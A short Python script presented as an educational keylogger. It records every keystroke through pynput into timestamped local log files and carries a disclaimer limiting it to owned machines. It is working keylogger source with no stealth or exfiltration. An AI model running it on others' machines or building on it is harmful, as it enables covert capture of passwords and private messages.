"""
Educational Keylogger - For Demonstration & Awareness Purposes Only

Author: Divyesh Sai Gutta
Date: 2025-07-30
License: MIT

DISCLAIMER:
This script is for **educational** use only, to demonstrate how keylogging works and how such tools can be detected and mitigated.
Never use on machines you do not own or without permission.

Dependencies:
    pip install pynput
"""

from pynput import keyboard
import logging
import os
from datetime import datetime

# Ensure the logs directory exists
log_dir = "./logs/"
os.makedirs(log_dir, exist_ok=True)

# Setup logging with timestamped filename
timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
log_file = f"{log_dir}keylog_{timestamp}.txt"
print(f"Logging to: {log_file}")

logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key {key.char} pressed")
    except AttributeError:
        logging.info(f"Special key {key} pressed")

# Start key listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
